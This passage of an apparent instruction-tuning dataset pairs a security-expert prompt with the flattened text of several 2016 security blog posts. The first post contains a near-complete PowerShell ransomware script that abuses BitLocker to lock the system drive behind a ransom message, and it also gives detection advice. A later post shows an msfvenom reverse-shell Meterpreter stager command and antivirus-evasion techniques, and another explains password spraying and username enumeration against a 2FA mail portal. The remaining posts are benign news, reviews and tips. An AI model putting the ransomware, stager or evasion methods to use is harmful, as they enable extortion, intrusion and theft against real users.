        "output": "Editor's Note We're excited to publish our first guest post If you'd like to guest post on our blog DM us on Twitter or use our contact form to contact us for details _________ Robert Schwass I don't know how I got there but a few days ago I found myself looking at an article on the new features that Microsoft has implemented for BitLocker on Windows 10 The most noteworthy of the features that really captured my attention was that there is a new group policy for configuring pre-boot recovery I know that doesn't sound all that exciting by itself but if you combine that with another feature introduced in Windows 8 where the OS drive can now be encrypted without a TPM Trusted Platform Module and even without a USB drive you have a recipe for evil After presenting this discovery to BHIS they had questions of their own More research revealed that you can strip away the recovery keys and passwords on a protected drive and replace them without having to know what those passwords or keys were to begin with BitLocker Based Ransomware Using the BitLocker Cmdlets for Powershell I was able to create a script that encrypts the System drive with a custom recovery message The following script locks the drive and throws away the recovery key by placing it on the drive being encrypted The only way to unlock the drive is with the password If the drive is already protected with BitLocker the script strips out all of the passwords and recovery keys and replaces them Note The script requires local administrative rights BitLocker for Ransom Is BitLocker already enabled on the system drive Check get-BitLockervolume -mountpoint ENV SystemDrive Status Check.ProtectionStatus if Status -eq 'Off echo 'BitLocker NOT Enabled on System Drive if Status -eq 'On echo 'BitLocker IS Enabled on System Drive Set registry first REG ADD HKLM SOFTWARE Policies Microsoft FVE v EnableBDEWithNoTPM t REG_DWORD d 1 f REG ADD HKLM SOFTWARE Policies Microsoft FVE v UseAdvancedStartup t REG_DWORD d 1 f REG ADD HKLM SOFTWARE Policies Microsoft FVE v UseTPM t REG_DWORD d 2 f REG ADD HKLM SOFTWARE Policies Microsoft FVE v UseTPMKey t REG_DWORD d 2 f REG ADD HKLM SOFTWARE Policies Microsoft FVE v UseTPMKeyPIN t REG_DWORD d 2 f Change the recovery message to meet your needs In my example I put a fake website where the victim can come and pay for their password REG ADD HKLM SOFTWARE Policies Microsoft FVE v RecoveryKeyMessage t REG_SZ d 'please Visit my hacker site ourscrewed.hahaha to give me money f REG ADD HKLM SOFTWARE Policies Microsoft FVE V RecoveryKeyMessageSource t REG_DWORD d 2 f REG ADD HKLM SOFTWARE Policies Microsoft FVE v UseTPMPIN t REG_DWORD d 2 f Use a Strong Password Here PlainPassword P ssw0rd SecurePassword PlainPassword ConvertTo-SecureString -AsPlainText -Force if Status -eq 'Off Enable BitLocker Encrypt the used space on the C drive enable-BitLocker -EncryptionMethod Aes256 -password securepassword -mountpoint ENV SystemDrive -PasswordProtector -skiphardwaretest -UsedSpaceOnly To use the Custom Recovery Screen there must be a recovery key created I dont want to use the recovery key so I put it on the encrypted C drive so it is inaccessible add-BitLockerkeyprotector -mountpoint ENV SystemDrive -RecoveryKeyProtector -RecoveryKeyPath ENV SystemDrive Uncomment to restart the Computer ASAP so that the damage is done before the user can undo it I dont do this by default restart-computer If BitLocker is already enabled on the systemd drive The following will execute removing all passwords and recovery keys Then adding my own passwords and keys just like before if Status -eq 'On Strip all Passwords and Recovery keys Not yet Tested with TPM IDS check.KeyProtector.KeyProtectorID foreach ID in IDS Remove-BitLockerKeyProtector -Mountpoint ENV SystemDrive -KeyProtectorID ID add-BitLockerkeyprotector -mountpoint ENV SystemDrive -PasswordProtector -Password securepassword add-BitLockerkeyprotector -mountpoint ENV SystemDrive -RecoveryKeyProtector -RecoveryKeyPath ENV SystemDrive Resume-BitLocker -MountPoint ENV SystemDrive ENDSCRIPT The script executes quickly and the next time the computer reboots the user is hit with the usual BitLocker password prompt Pressing the ESC key they can see the recovery options You will see the custom recovery message that was put into the system's registry And there you have it Ransomware using Microsoft built in features and tools I will not go into detail on how to weaponize this into a payload or force a prompt for elevation there are plenty of blog posts and videos on the internet that already have that information There is a line available in the script that will restart the computer as soon as the script executes this prevents the user from halting the locking process I leave the restart option commented out by default as I think most users will ignore the small notification that warns them the drive is being encrypted In my experience this notification only appears if the drive was not encrypted before the script ran Research Caveats I did all of this research on a workgroup fresh install of Windows 10 Evaluation There is nothing that suggests to me that doing this on a domain joined system would not have similar results as BitLocker reads the current registry settings not the ones loaded at boot time Defenses Be Prepared to Lose Everything Backup your personal data If everything you need is in the cloud on an external device or some other remote storage you will be fine Defenses How do I Identify this is happening Detection With Powershell or CMD This is simple to detect if you are looking for it You can use the same tools that enabled BitLocker to detect if it is running There are ways within Windows to run a script at Shutdown Restart or even have a script run at a regular interval that queries if BitLocker is on and what where the recovery keys and methods are Compare what the current recovery key is to what you know that key should be if the key is something different then reset the keys or send an alert to the helpdesk etc The manage-bde.exe tool allows you to do similar tasks as the Powershell CMDlets if you are more comfortable with cmd and batch scripts Detection With Event Logs BitLocker events do log to the source Applications and Services Microsoft Windows BitLocker-API Management by default Event 775 occurs when a Key Protector is created Event 768 occurs when encryption starts on a drive at least in my testing the c drive There are other events in there 796 and 780 that occurred during my experiment Setting up alerts on these logs is a great way to detect if BitLocker is being turned on off or the keys are being changed Also avoid giving attackers administrative privileges in the first place Use common malware defenses scanning email attachments user awareness training etc Personally I think Microsoft made a big mistake allowing BitLocker to be configured without forcing the use of USB or TPM they also really missed the security mark by not making you reauthenticate passwords and recovery keys before changing them I reached out to the Microsoft Security Response Center expressing my concerns with the current implementation of BitLocker and they were so kind as to respond Microsoft MSRC Rep Hello Thank you for contacting the Microsoft Security Response Center MSRC To use BitLocker in this way the malicious person would need to have already compromised the machine and would have Administrator Privilege in that case they could do whatever they wanted to the system just as any local administrator could Regards MSRC I replied back There are many security technologies in place today that even though my system is compromised the attacker still has to authenticate to change the password Is there a way I can implement BitLocker in such a way to force the administrator to authenticate the Recovery Key before changing it Is Microsoft considering adding functionality like this to BitLocker in the future Microsoft Responded Thank you for contacting the Microsoft Security Response Center MSRC This would not be a security vulnerability and is likely by design You can submit the suggestion to the Windows team using the Windows Feedback app in Windows 10 Microsoft does take security seriously I just need to find the right way to release this information I will follow the suggestion from Microsoft from inside a virtual machine I don't like to tie my operating system to my Microsoft account call me old fashioned _____ To grab a copy paste version of the code visit Robert's GitHub here"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Lawrence's List 061716</title>\n<taxonomies>News, everything on the internet is true, Guccifer 2.0, hype it's all hype, Julian Assange, Management Engine, Net Neutrality, Photomniner</taxonomies>\n<creation_date>Fri, 17 Jun 2016 15:00:20 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Lawrence Hoffman Certain Intel chips come with what's called a Management Engine or ME This is an actual physical subsystem which implements Intel's Active Management Technology AMT Why is it on a security blog Because it has full control over everything your machine does uses security by obscurity and if infected would be totally undetectable and totally unfixable oingboing.net 2016 06 15 intel-x86-processors-ship-with.html Net neutrality For those who haven't been following let me give a short overview ISPs would like to sell you access to the internet piecemeal That is you would no longer pay one fee for equal access to all websites Rather you'd purchase access much the same way as we purchase access to cable TV Facebook and Twitter would be one fee using Google search another fee etc Furthermore they'd like to be able to prioritize delivery For example assume you owned an ISP and you wanted to start an on demand video service how to get new adopters Make the current video services deliver so slowly that you become the only watchable option Thankfully the FCC's ruling that the internet is a medium of communications was upheld by the courts this week This isn't over though ISPs are claiming that not being allowed to block or handicap sites is an infringement of their freedom of speech and they'll likely continue this battle for as long as they can rstechnica.com tech-policy 2016 06 net-neutrality-and-title-ii-win-in-court-as-isps-lose-case-against-fcc This grabbed my attention The worm dubbed Photominer is pretty neat in concept and design Here's the plan Brute force weak ftp passwords Infect websites on those ftp servers with malware that infects machines of people who visit the site Pivot within the victim's environment using SMB dropping as many copies as possible Set up fake Wi-Fi access points that infect other machines when they try to connect Use all the infected machines to mine Monero a crypto currency Profit ww.guardicore.com 2016 06 the-photominer-campaign Hype warning You're reading stuff on the internet it may not be true I've read enough articles on this that I'm getting turned around as to who did what At the beginning of the week we heard that Julian Assange is planning another dump of information on Hillary Clinton which he believes will lead to her indictment ww.theguardian.com media 2016 jun 12 wikileaks-to-publish-more-hillary-clinton-emails-julian-assange For the most part this is a political issue and I wasn't considering it for this column but then came how Mr Assange supposedly acquired this data and made this a security matter Shortly after Assange's announcement came news that Russian hackers had penetrated several DNC assets and were in possession of the opposition research on Donald Trump ww.politico.com story 2016 06 russian-government-hackers-broke-into-dnc-servers-stole-trump-oppo-224315 Interesting and I think it was here that people began to believe that Russia had perhaps given information found on the same servers that Assange claims could lead to the indictment of Hillary Clinton to WikiLeaks A new player entered the game at this point claiming to be a lone hacker Guccifer 2.0 who claims they were the ones who broke into the DNC server and dropped a few documents as evidence rstechnica.com security 2016 06 lone-wolf-claims-responsibility-for-dnc-hack-dumps-purported-trump-smear-file It's been about two days since I've read anything further on the case As noted above in the hype warning remember that none of the information in the articles above is anything we should call actual evidence"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Book Review: \"Red Team - How to Succeed by Thinking Like the Enemy\"</title>\n<taxonomies>Author, Brian King, InfoSec 101, Red Team, kitchen remodel, pen-testing, penetration testing, pentest, Pentesting, Red Team, red team your life, red teaming</taxonomies>\n<creation_date>Mon, 20 Jun 2016 16:32:50 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Brian B King Red Teaming is one of those terms popping up all over the place lately and it seems to mean different things to different people Is it just an intense pentest with looser rules of engagement Is it people on-site breaking in at night Is it when you actually steal the asset instead of taking a picture to prove you got to it Micah Zenko Senior Fellow at the Council on Foreign Relations wrote Red Team How to Succeed by Thinking Like the Enemy that gives a wide-ranging treatment of the question The way he describes Red Teaming it isn't a specific set of techniques or rules but a way of looking at things differently to help avoid unpleasant surprises The book starts off in antiquity with the Devil's Advocate which was an actual position in the Catholic Church whose responsibilities were to argue against a proposed elevation to sainthood The title came from the idea that it was in the Devil's interest to limit the number of saints This position was in place until 1983 In the 20 years after it was removed the Church approved more sainthoods and beatifications than in the prior 2000 years The Devil's Advocate was maybe the first red team position and it had a clear effect it restrained the organization and made sure that its decisions were supported by the available evidence Whether it went too far is not the point The point is that it was a respected well-staffed influential process that forced some critical thinking The book describes a red team approach as one that uses simulations vulnerability probes and alternate analyses to reveal and test unstated assumptions identify blind spots and potentially improve outcomes and performance The problem of how to determine when your practices are producing suboptimal outcomes leads to the central theme you cannot grade your own homework All of that is from the introduction A red team approach calls on knowledgeable experts with the necessary information to evaluate anything You can red team an organization's security controls You can red team the decision to go to market with a new product You can red team an intelligence assessment based on the information we can gather is this site a civil nuclear power station a start to a weapons program a ruse to force another country's hand Something else entirely Red teaming is most successful when those knowledgeable experts are not part of the core team The team that came up with the plan-so-far cannot help but be blind to some of the embedded assumptions The people on your red team should have the necessary domain knowledge but not already be invested in the project's direction They should be the kinds of people who can identify correlations or interactions that others overlook They should be able to put themselves in the mindset of a motivated adversary and should be familiar with what actual adversaries actually do They should be able to step back and look with fresh skilled eyes and not be afraid to describe what they see Red teaming is very close to penetration testing but maybe encompasses a larger set of options and targets The next time you're making a decision at home or at work think about a red team analysis I'm considering an update to my kitchen I'm shocked at the initial estimates and more than a little hesitant to pull the trigger on such an outlay not to mention the disruption to my home while it happens My sister recently had her kitchen re-done She has some fresh knowledge and experience that I don't and she knows me well enough to know what's important to me So I'm asking my sister to red team my kitchen plans Before I read this book that would have sounded to me like a silly thing to say But now there's no way I'm going forward without it Book Red Team How to Succeed by Thinking Like the Enemy Author Micah Zenko Link ww.cfr.org defense-and-security red-team p36481"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>SSH Config Files</title>\n<taxonomies>Author, Blue Team, Blue Team Tools, Ethan Robish, Red Team, Red Team Tools, Linux, ssh config files, SSH configs</taxonomies>\n<creation_date>Wed, 22 Jun 2016 14:26:24 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Ethan Robish Here's a short intro for anyone not familiar with ssh config files which are usually located at .ssh config As an example you have ssh running on port 2222 on a system you refer to as linux with the username of root You might have an ssh config entry that looks like this Host linux HostName 192.168.1.100 Port 2222 User root In this example linux is simply any name you want to use when connecting to the remote system It has nothing to do with the actual hostname or any other configuration of the remote system This lets you shorten your ssh command to ssh linux instead of ssh -p 2222 root 192.168.1.100 It also works for scp like this scp some_file linux root some_file This is just scratching the surface for what you can do but it is definitely made my life much more convenient Other common directives I use are LocalForward DynamicForward and IdentityFile which correspond to the -L -D and -i ssh command line options respectively This was a quick introduction but here is an excellent article that goes into more depth if you're interested in learning more erderati.com 2011 03 17 simplify-your-life-with-an-ssh-config-file And of course you can check the man page for ssh_config if you really want to geek out Bonus Tip Have you ever wanted to add a port forward to an existing SSH connection Maybe you just decided to kill the connection and start it again with the additional command-line options If for some reason you can't restart your connection fret not In OpenSSH you can add a port forward by entering the correct EscapeChar and then starting an OpenSSH command line By default the escape character is tilde and a capital C is used to enter a command After that you can specify a port forward just like you would if you called ssh from the command line So instead of running this ssh linux -L 8000 127.0.0.1 8000 You could stay in your ssh session and use the C sequence instead Reference oderwall.com p 5wp2wg start-port-forwarding-over-an-existing-ssh-connection-instead-of-creating-a-new-one"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Lawrence's List 062416</title>\n<taxonomies>News, GoToMyPC, iOS10, Linux Kernel, PyCon2016, UDP, unencrypted kernel</taxonomies>\n<creation_date>Fri, 24 Jun 2016 18:46:44 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "This week is going to be sort of short I get to go on vacation I'll still be trying to do some minimal posts during the next two weeks but I'm mostly going to be concentrating on a book and a hammock so forgive me if they're short All in all this week was pretty quiet for infosec related things I've add a few blurbs about projects I like that I felt like many people may not know about as well as some things that are maybe tangentially related to security but more about programming Sophisticated password attack Citrix reset all of its passwords for gotomypc after claiming that there were password reuse attacks happening against client accounts While this doesn't really qualify as sophisticated in my book I thought it interesting that a company that makes its money on providing remote access to computers isn't requiring two factor authentication For those of you who do use gotomypc here's how to set up 2fa upport.citrixonline.com en_US gotomypc all_files gtc070021 And here's the announcement as to why you should tatus.gotomypc.com incidents s2k8h1xhzn4k PyCon 2016 had a talk that caught my attention Every once in awhile I come accross the problem of wanting to transfer one simple file from one of my machines to another usually a vps system in Digital Ocean and don't want to mess with scp for one reason or another to lazy to upload the key while also being too paranoid to turn on password auth and for those moments I came up with this ithub.com lawrencehoffman spit which is a simple python script to encrypt data across sprunge a pastebin like service It's secure enough for most of my personal projects in that it uses AES Then I saw this project called magic-wormhole It's great I haven't finished my personal security review yet so I won't be using it for any official business until I have looked over the code and feel like I can be confident that correct measures are being taken with the crypto but for personal stuff it seems good enough to me ithub.com warner magic-wormhole Long story short the dev preview came out for iOS 10 with an unencrypted kernel Some people thought this was a mistake to put it simply there was no way this was a mistake Now Apple has confirmed as much After having removed vulnerable user data out of the kernel Apple has left the kernel unencrypted for a performance gain echcrunch.com 2016 06 22 apple-unencrypted-kernel Some work has been being done by Tom Herbert over at Facebook get Transports over UDP added to the Linux kernel What is it Transport over UDP outlined here ools.ietf.org html draft-herbert-transports-over-udp-00 would allow developers to create network protocols encapsulated in UDP where the stack exists in user space This is interesting because this very activity is historically frowned upon by the Linux kernel team It is reasoned that rather than implementing new protocols over UDP one should prefer to improve the Linux kernel's current systems Facebook's motivation here is that it takes too long to get a new protocol into the hands of many users once in the kernel mainstream distributions of the kernel like those included in Android must enable the module which often doesn't happen for years Herbert claims that with TOU developers will be able to roll out a new feature which relies on a custom protocol stack in months rather than years wn.net Articles 688529"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Juniper Two Factor VPN & Linux</title>\n<taxonomies>Author, David Fletcher, External/Internal, Red Team, Juniper, SSL, SSL VPN concentrator, VPN</taxonomies>\n<creation_date>Mon, 27 Jun 2016 19:37:08 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "David Fletcher On a recent internal penetration test engagement I was faced with using a Juniper VPN to access the target network One small problem Juniper does not formally support Linux operating systems The Juniper Pulse and Pulse Secure clients are only available for Windows and OSX Since I didn't have an OSX system I would have been forced to give up several tools that are extremely useful I did a fair amount of searching and found several solutions to the problem However many were somewhat complex and had a time investment requirement that just didn't make sense for my temporary access requirement In the end I found the following post the most useful for successfully connecting lexeymoseyev.wordpress.com 2014 10 29 junos-pulse-vpn-client-on-linux-two-phase-auth-64bit-how-to-make-it-all-work Since I was only connecting to this device on a temporary basis I just bypassed the Grease Monkey script and used a simple substitution The process is outlined below OpenConnect First install OpenConnect using your favorite package manager In order to make this work you have to be running OpenConnect v7.05 or later Starting with v7.05 the OpenConnect client has the --jupiter switch included which provides experimental connectivity to Juniper VPN devices Documentation for this switch is available at the following URL ww.infradead.org openconnect juniper.html You won't find this information or evidence of the switch in the man page or help for OpenConnect Cookie Manager Next you'll need a cookie manager To prepare for building your SSL Tunnel you'll need to log onto the VPN web interface This will place the DSID session cookie into your browser cookie storage Once it is there we will grab the value and pass it to OpenConnect on the command line in order to complete authentication For this purpose I just used Cookies Manager which I keep installed for web application penetration test engagements The Full Process Now that all of the prerequisites have been met we'll log into the Juniper Web Interface Log in using your user account pin and token value Your pin is set up when you first access the VPN web interface The passcode seen below is your pin and current two factor token value concatenated in that order After successfully authenticating to the web interface your browser will have multiple cookies set for the Juniper site Open your cookie manager to review them One of these cookie values has the name DSID This value is necessary to complete the authentication process Copy the value into your clipboard Next open a root shell and execute the following command to establish an SSL VPN tunnel with the target VPN concentrator After executing this command you should see output similar to the following indicating the progress of the negotiation process Voila successful tunnel negotiation with a Juniper SSL VPN concentrator and nearly zero overhead"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>A Letter from John</title>\n<taxonomies>Author, InfoSec 101, John Strand, News, customers, infosec, leadership, Management, Patagonia, people over profit, vested interest</taxonomies>\n<creation_date>Wed, 29 Jun 2016 16:54:52 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "John Strand Last week BHIS took a new direction as a company Warning this blog is not technical But it is important In the past few years we've grown considerably The vast majority of our work is received from previous satisfied customers which is mainly because of the awesome job that our testers have done Every company likes to brag that their employees are their most important asset I remember being at Accenture and one of the managing partners had the audacity to say something along these lines How can this be true of a company with over 30 000 employees It is just not possible At some point a company has to start focusing on profits and unfortunately the people in the company often become a distant priority Don't believe me Look at overtime Many companies pay their employees a fixed salary and then basically force the them to work ridiculous overtime To the upper level goes the spoils The employees get to bask in the warm glow of knowing they have jobs Erica my wife and I didn't want to create a company like this we wanted something different We've been spending a lot of time looking into B corp status and looking at how other companies like Patagonia run and we are learning ways to stay focused on our goal of keeping BHIS people both employee and customer instead of profit driven Moving forward BHIS will be splitting profits equally with our employees who have been with us for a specified period of time What does that mean for our customers First it means your tester has a vested interest in doing a great job far beyond just a simple paycheck Second in order for each tester to have space to do their best work we try to limit them to one primary gig at a time I talk with a lot of other testers for other firms and they are consistently working on two or three and sometimes four tests at the same time This is a recipe for a really crummy pentest regardless of the brilliant skills of the tester We may not be the cheapest but I am confident in the quality of our work and confident in your entire customer experience with us So why a blog post about this Well happy employees do great work We want to have the best employees and do the best work possible for our customers When I say our people and the quality of work we do is our key differentiator I want it to mean something It has in the past and we are taking steps to ensure that it will in the future"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Lawrence's List 070116</title>\n<taxonomies>News, backdoor, font fuzzing, NSA, random number generator, RSA</taxonomies>\n<creation_date>Fri, 01 Jul 2016 15:20:16 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Lawrence Hoffman As I previously mentioned I'm on vacation this week and next As I like to go for long cross-country drives I've not had much time to keep up with the news Just to be sure we don't break pace I'm still trying to talk a little about the things I did get a chance to read I love to see articles about fuzzing techniques I found this article about windows font fuzzing an interesting read on my phone one night at a campground oogleprojectzero.blogspot.com 2016 06 a-year-of-windows-kernel-font-fuzzing-1_27.html We've heard the stories of NSA backdooring a random number generator which was subsequently used by RSA in at least one of their more popular packages This is an article sent over to me by Sally sallyvdv I really enjoyed reading this paper though some of the mathematics involved may put some people off print.iacr.org 2016 644.pdf There'll be another super short one next week and then a return to full length reviews the week following"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Question:  What Can I Learn from Password Spraying a 2FA Microsoft Web App Portal?</title>\n<taxonomies>External/Internal, Red Team, 2 factor authentication, 2FA, fun fun fun, MFA, Microsoft, Microsoft Web App Portal, password spraying, passwords</taxonomies>\n<creation_date>Tue, 05 Jul 2016 17:31:03 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Carrie Roberts Answer Enough to make it worth it Penetration testers love to perform password spraying attacks against publicly available email portals as described here in this great post by Beau Bullock Recently I performed a password spray against an Outlook Web App portal that had multi-factor authentication enabled using Microsoft MFA The login page looked the same but the server responses gave away some very interesting information Outlook Web App Login As I password sprayed this portal which had two-factor authentication enabled I was able to learn two important things 1 Whether a username was valid or invalid aka Username Enumeration 2 Whether the password was correct for a given username even though access was not granted Here at BHIS we have learned through experience that the server response time when given a valid username is much quicker than when given an invalid username many thanks to Brian Ferhman for all the things we've learned because of his work The screenshot below shows examples of response times for valid versus invalid usernames Username Enumeration We use the Burp Intruder tool to do password spraying You can view the response time by turning on the Response Completed column in the results table view View Response Time with Burp Intruder Cool We just built a valid list of usernames which can come in handy later on in the test The next super cool thing we can learn is whether the password we guessed is correct for the user Wait what You said two-factor was enabled Read-on Microsoft Multi-Factor Authentication MFA requires users to acknowledge a phone call or a text message before granting access to the resource After correct credentials are entered the server waits for the user to verify the attempt by pressing on the phone call they receive for example This is awesome from a security perspective however Microsoft still gives away whether the password is correct in its server response to valid credentials The response is only slightly different but it is enough as shown below Response Contains auth.owa When Password is Correct Login Response for Invalid Credentials How cool is that Now we have valid usernames and passwords to use elsewhere If we have been successful we have also caused an unsolicited text or phone call to some users so be careful"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Three Simple Disguises for Evading Antivirus</title>\n<taxonomies>Red Team, 64-bit, anti-virus, AV, meterpreter, meterpreter vs. antivirus</taxonomies>\n<creation_date>Thu, 07 Jul 2016 16:54:31 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Logan Lembke Antivirus has been a key component in defending computer systems since the 1990s Over the years antivirus began to dominate the discussion of PC security with other means falling to the wayside Brand names such as Symantec and McAfee have continually jockeyed for business each claiming that they alone possess the miracle cure Despite what you may hear let me reassure you antivirus is dead Here's why Evading Antivirus Is Dead Simple First off detecting malicious code is hard To date no one has figured out how to answer the question Is this piece of code going to ruin my day However we have figured out how to answer the question Does this piece of code look like something that has ruined someone else's day If we want to avoid detection all we have to do is put a moustache and monocle on our code before we ship it on its way They'll Never See Me Coming Disguising malicious code can be accomplished using a few techniques but before we take a look at what makes for a good disguise let's discuss what malicious code tends to look like The Lay Person's Interpretation of Meterpreter According to Offensive Security Meterpreter is an advanced dynamically extensible payload that uses in-memory DLL injection stagers and is extended over the network at runtime It communicates over the stager socket and provides a comprehensive client-side Ruby API It features command history tab completion channels and more Put more simply Meterpreter is a piece of code that can load more code as it runs It can use different methods to communicate back to its server and the client can be extended by other programmers As such Meterpreter is often used by attackers to control a target's machine and since the program is easily extended Meterpreter can launch a slew of attacks ranging from key loggers to privilege escalation Meterpreter Vs Antivirus FIGHT While antivirus can detect Meterpreter the architecture behind the program makes it exceedingly difficult to catch Often times Meterpreter will be launched by a stager The stager's job is to establish communications between the target's computer and the attacker's server Additionally it needs to begin loading the rest of the Meterpreter client Thanks to this piece-by-piece architecture only the stager needs to be deployed on the target's computer before the program can be run Since the rest of Meterpreter can be launched from memory only the stager needs to sneak its way past AV Shellcode A Meterpreter stager can be deployed on a target's computer using a few techniques At the heart of each technique lies shellcode In reference to a Meterpreter stager the shellcode is the machine code which actually accomplishes the stager's goals setting up communications and launching the rest of Meterpreter Shell code has been used throughout several blog posts which have been previously published on our site In Brian's excellent post How to Bypass Application Whitelisting AV he uses the following command to generate shellcode which can be executed in the C programming language msfvenom -p windows meterpreter reverse_tcp lhost YOUR_IP lport 443 -f csharp shellcode.txt This command writes the following mess out to a file named shellcode.txt Wat What we're looking at is a list of hexadecimal numbers which correspond to the machine code needed to create a Meterpreter stager Specifically this stager connects back to an attacker's machine on TCP port 443 and begins loading the rest of the Meterpreter client Identifying this shellcode is one way antivirus products may go about identifying malicious look-alike programs Templating While everyone loves to talk about shellcode there is more that goes into creating a Meterpreter stager The shellcode must be executed by something Old school exploits work by loading the shellcode into a vulnerable program and forcing the program to execute it In the case of phishing shellcode can be embedded within VBA macros and ran inside Microsoft Word Excel and PowerPoint documents Check out Sally's awesome post for evading AV in PowerPoint here In the simplest case the shellcode is placed inside of a premade template and executed by itself By default MSFVenom the most common program used to generate Meterpreter stagers supplies its own templates However as Joff has previously explained here these templates can be altered Why would we want to alter the template Simply put most AV products check the template used to execute the shellcode rather than the shellcode itself Now to Just Give Them Fake Moustaches Disguises So far we have identified the Meterpreter stager and we have seen that it is made up of both shellcode and a template Now let's look at the different disguises available for hiding our stager We can change the architecture of the whole stager modify the template around the shellcode or change the shellcode itself Each change adds something new to the disguise Some changes will vastly alter our executable others will only slightly affect the results We will compare the usefulness of each technique later on in the post 64 Bits of Magic Currently the Steam Hardware Survey indicates that over 85 of their users are running 64-bit operating systems While this may not be representative of the business sector it is clear evidence that 64-bit operating systems are becoming more common When targeting a 64-bit operating system we have the choice of deploying either a 32-bit or 64-bit stager While the 32-bit stager will work on any modern Windows installation the 64-bit stager is much more evasive There is nothing inherently sneaky about using 64-bit stagers but it seems as if there have been fewer signatures written for the 64-bit variants of the most common Meterpreter stagers Template Trickery MSFVenom provides two default templates for Windows executables one for 32-bit shellcode and another for 64-bit shellcode These templates are essentially empty .exe files and are well known to antivirus engines Windows EXE files following the PE COFF format are made up of several different sections each with different permissions These permissions restrict the ability to read write or execute data at run time For example the section which contains the code to be executed .text is generally not writeable at run time When creating a Meterpreter stager MSFVenom will look at the default executable .text section of the template being used and if there is enough space insert the shellcode into it Otherwise MSFVenom will create a new section in the .exe file mark it as executable place the shellcode there and modify the executable to start from the new section However rather than using MSFVenom's default templates we may choose to provide our own EXE file for the program to modify Common choices for this technique are the executables included with every Windows installation such as write.exe and notepad.exe By default the template executables will no longer function as normal unless MSFVenom is explicitly told to start the stager in a new thread Rolling Your Own Template Beyond altering existing executables we may choose to write our own templates In this approach we use MSFVenom to generate shellcode for use in a programming language of our choice In the following example I chose the C programming language Then we insert the shellcode into our homemade template and tell the 